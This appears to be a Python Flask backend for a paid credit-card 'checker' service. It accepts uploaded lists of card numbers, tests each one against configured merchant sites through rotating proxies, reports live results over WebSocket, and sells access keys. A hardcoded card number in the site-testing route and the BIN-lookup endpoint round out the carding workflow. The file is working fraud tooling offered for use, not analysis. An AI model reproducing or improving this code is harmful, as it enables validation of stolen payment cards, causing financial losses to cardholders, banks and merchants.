@app.route('/api/upload_cards', methods=['POST'])
@login_required
async def upload_cards():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and file.filename.endswith('.txt'):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        with open(filepath, 'r') as f:
            content = f.read()
        
        cards = extract_all_cards(content)
        
        os.remove(filepath)
        
        sites_data = await load_json(SITE_FILE)
        global_sites = sites_data.get("global", [])
        
        if not global_sites:
            return jsonify({'error': 'No sites configured'}), 400
        
        # Start background process
        process_id = str(uuid.uuid4())
        ACTIVE_PROCESSES[process_id] = {
            'cards': cards,
            'results': [],
            'status': 'processing',
            'user_id': session.get('user_id')
        }
        
        # Start async processing
        asyncio.create_task(process_cards_batch(process_id, cards, global_sites))
        
        return jsonify({'process_id': process_id, 'total': len(cards)})
    
    return jsonify({'error': 'Invalid file type'}), 400

async def process_cards_batch(process_id, cards, sites):
    results = []
    for i, card in enumerate(cards):
        if process_id not in ACTIVE_PROCESSES:
            break
        
        result, site_index = await check_card_random_site(card, sites)
        results.append({
            'card': card,
            'result': result,
            'site_index': site_index,
            'index': i + 1,
            'total': len(cards)
        })
        
        ACTIVE_PROCESSES[process_id]['results'] = results
        ACTIVE_PROCESSES[process_id]['progress'] = i + 1
        
        # Emit progress via WebSocket
        socketio.emit('progress', {
            'process_id': process_id,
            'current': i + 1,
            'total': len(cards),
            'result': result,
            'card': card
        })
        
        await asyncio.sleep(0.5)
    
    ACTIVE_PROCESSES[process_id]['status'] = 'completed'

@app.route('/api/process_status/<process_id>')
@login_required
def process_status(process_id):
    if process_id not in ACTIVE_PROCESSES:
        return jsonify({'error': 'Process not found'}), 404
    
    process = ACTIVE_PROCESSES[process_id]
    return jsonify({
        'status': process['status'],
        'progress': process.get('progress', 0),
        'total': len(process['cards']),
        'results': process['results']
    })

@app.route('/api/get_sites')
@admin_required
async def get_sites():
    sites_data = await load_json(SITE_FILE)
    global_sites = sites_data.get("global", [])
    return jsonify({'sites': global_sites})

@app.route('/api/add_site', methods=['POST'])
@admin_required
async def add_site():
    data = request.json
    site = data.get('site', '').strip()
    
    if not site:
        return jsonify({'error': 'Site URL required'}), 400
    
    sites_data = await load_json(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if site not in global_sites:
        global_sites.append(site)
        sites_data["global"] = global_sites
        await save_json(SITE_FILE, sites_data)
        return jsonify({'success': True, 'site': site})
    
    return jsonify({'error': 'Site already exists'}), 400

@app.route('/api/remove_site', methods=['POST'])
@admin_required
async def remove_site():
    data = request.json
    index = data.get('index')
    site = data.get('site')
    
    sites_data = await load_json(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if index is not None:
        try:
            idx = int(index) - 1
            if 0 <= idx < len(global_sites):
                removed = global_sites.pop(idx)
                sites_data["global"] = global_sites
                await save_json(SITE_FILE, sites_data)
                return jsonify({'success': True, 'removed': removed})
        except ValueError:
            pass
    
    if site and site in global_sites:
        global_sites.remove(site)
        sites_data["global"] = global_sites
        await save_json(SITE_FILE, sites_data)
        return jsonify({'success': True, 'removed': site})
    
    return jsonify({'error': 'Site not found'}), 404

@app.route('/api/generate_keys', methods=['POST'])
@admin_required
async def generate_keys():
    data = request.json
    amount = data.get('amount', 1)
    days = data.get('days', 30)
    
    if amount > 50:
        return jsonify({'error': 'Maximum 50 keys at once'}), 400
    
    keys_data = await load_json(KEYS_FILE)
    generated_keys = []
    
    for _ in range(amount):
        key = generate_key()
        keys_data[key] = {
            'days': days,
            'created_at': datetime.datetime.now().isoformat(),
            'used': False,
            'used_by': None
        }
        generated_keys.append(key)
    
    await save_json(KEYS_FILE, keys_data)
    
    return jsonify({'keys': generated_keys})

@app.route('/api/get_proxies')
@admin_required
async def get_proxies():
    proxies_data = await load_json(PROXY_FILE)
    global_proxies = proxies_data.get("global", [])
    return jsonify({'proxies': global_proxies})

@app.route('/api/add_proxies', methods=['POST'])
@admin_required
async def add_proxies():
    data = request.json
    proxies_text = data.get('proxies', '')
    
    lines = proxies_text.splitlines()
    valid_proxies = []
    
    for line in lines:
        line = line.strip()
        if line:
            proxy_data = parse_proxy_format(line)
            if proxy_data:
                is_working, _ = await test_proxy(proxy_data['proxy_url'])
                if is_working:
                    valid_proxies.append(proxy_data)
    
    if valid_proxies:
        proxies_data = await load_json(PROXY_FILE)
        global_proxies = proxies_data.get("global", [])
        existing_urls = {p['proxy_url'] for p in global_proxies}
        
        added_count = 0
        for vp in valid_proxies:
            if vp['proxy_url'] not in existing_urls:
                global_proxies.append(vp)
                added_count += 1
        
        proxies_data["global"] = global_proxies
        await save_json(PROXY_FILE, proxies_data)
        
        return jsonify({'success': True, 'added': added_count, 'total': len(global_proxies)})
    
    return jsonify({'error': 'No working proxies found'}), 400

@app.route('/api/remove_proxy', methods=['POST'])
@admin_required
async def remove_proxy():
    data = request.json
    index = data.get('index')
    
    if index is None:
        return jsonify({'error': 'Index required'}), 400
    
    proxies_data = await load_json(PROXY_FILE)
    global_proxies = proxies_data.get("global", [])
    
    try:
        idx = int(index) - 1
        if 0 <= idx < len(global_proxies):
            removed = global_proxies.pop(idx)
            proxies_data["global"] = global_proxies
            await save_json(PROXY_FILE, proxies_data)
            return jsonify({'success': True, 'removed': removed})
    except ValueError:
        pass
    
    return jsonify({'error': 'Invalid index'}), 404

@app.route('/api/test_site', methods=['POST'])
@admin_required
async def test_site():
    data = request.json
    site = data.get('site')
    
    if not site:
        return jsonify({'error': 'Site URL required'}), 400
    
    test_card = "4031630422575208|01|2030|280"
    result = await check_card_specific_site(test_card, site)
    
    return jsonify(result)

@app.route('/api/get_bin_info', methods=['POST'])
@login_required
async def bin_info():
    data = request.json
    card = data.get('card', '')
    
    if len(card) < 6:
        return jsonify({'error': 'Invalid card number'}), 400
    
    brand, card_type, level, bank, country, flag = await get_bin_info(card)
    
    return jsonify({
        'brand': brand,
        'type': card_type,
        'level': level,
        'bank': bank,
        'country': country,
        'flag': flag
    })

@app.route('/api/stats')
@admin_required
async def stats():
    premium_users = await load_json(PREMIUM_FILE)
    banned_users = await load_json(BANNED_FILE)
    keys_data = await load_json(KEYS_FILE)
    sites_data = await load_json(SITE_FILE)
    proxies_data = await load_json(PROXY_FILE)
    
    used_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_keys = len(keys_data)
    
    return jsonify({
        'premium_users': len(premium_users),
        'banned_users': len(banned_users),
        'total_keys': total_keys,
        'used_keys': used_keys,
        'total_sites': len(sites_data.get('global', [])),
        'total_proxies': len(proxies_data.get('global', []))
    })

# Initialize files on startup
@app.before_first_request
def setup():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(initialize_files())
    loop.close()

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)
